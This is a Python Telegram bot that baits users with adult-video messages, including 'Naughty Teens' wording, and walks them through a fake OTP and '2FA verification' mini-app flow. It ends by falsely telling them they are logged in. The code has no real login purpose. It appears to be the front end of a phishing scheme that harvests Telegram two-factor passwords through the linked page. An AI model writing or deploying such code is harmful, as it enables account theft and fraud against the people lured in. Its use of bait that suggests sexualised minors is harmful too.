import os
import random
import asyncio
from dotenv import load_dotenv
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL")

user_otps = {}


def generate_otp():
    return str(random.randint(10000, 99999))


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🔞 Watch 18+❤️", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏 Watch Now! 👇",
        reply_markup=reply_markup
    )


async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.effective_message.web_app_data.data
    user_id = update.effective_user.id
    
    if data.startswith("request_otp:"):
        otp = generate_otp()
        user_otps[user_id] = otp
        await update.effective_message.reply_text(f"🔢 Your OTP is: {otp}\n\nPlease enter this code in the mini app!")
    elif data.startswith("verify_otp:"):
        otp_entered = data.split(":")[1]
        if user_id in user_otps and user_otps[user_id] == otp_entered:
            # Send 2FA button
            keyboard = [
                [KeyboardButton("🔐 Verify 2FA", web_app=WebAppInfo(url=MINI_APP_URL + "/twofa.html"))]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            await update.effective_message.reply_text(
                "✅ OTP verified successfully! Now click below to verify 2FA.",
                reply_markup=reply_markup
            )
        else:
            await update.effective_message.reply_text("❌ Invalid OTP, please try again!")
    elif data.startswith("verify_2fa:"):
        await update.effective_message.reply_text("✅ 2FA verified successfully! You're now logged in! Enjoy the videos! 🎉")


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    
    application.run_polling()


if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    main()
